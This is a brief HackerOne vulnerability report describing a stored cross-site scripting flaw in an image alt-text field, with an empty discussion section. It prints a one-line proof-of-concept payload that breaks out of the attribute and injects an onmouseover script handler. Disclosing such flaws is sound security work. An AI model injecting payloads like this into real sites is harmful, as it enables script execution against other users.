# HackerOne Report: Stored XSS in Image Alt. Text
**Report ID:** 50782
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic

## Vulnerability Information & PoC
XSS payload can be executed and saved permanently in Image Alt. Text.
Poc Code:  "><b onmouseover=alert('Wufff!')>click me!</b><"

## Discussion & Remediation Timeline
